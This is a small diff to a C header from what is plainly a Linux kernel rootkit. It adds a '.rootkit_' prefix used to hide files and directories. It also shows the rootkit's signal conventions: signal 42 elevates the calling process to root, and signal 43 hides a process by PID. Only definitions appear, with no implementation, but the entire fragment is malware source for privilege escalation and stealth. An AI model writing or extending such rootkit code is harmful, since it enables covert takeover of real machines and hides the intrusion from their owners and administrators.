@@ -4,8 +4,9 @@
 #include <linux/types.h>
 #include <vdso/limits.h>
 
-extern const char S_HIDDEN_PREFIX[];                       // Prefix for hidden files/directories
-#define SZ_HIDDEN_PREFIX_LEN (sizeof(S_HIDDEN_PREFIX) - 1) /* Length of the prefix */
+#define HIDDEN_PREFIX ".rootkit_"                        /* Prefix for hidden files/directories */
+#define HIDDEN_PREFIX_LEN (sizeof(HIDDEN_PREFIX) - 1) /* Length of the prefix */
+extern const char S_HIDDEN_PREFIX[];                     // Prefix for hidden files/directories
 
 #define SIGROOT 42 /* Elevate the current process to root */
 #define SIGHIDE 43 /* Hide the process with the given PID */
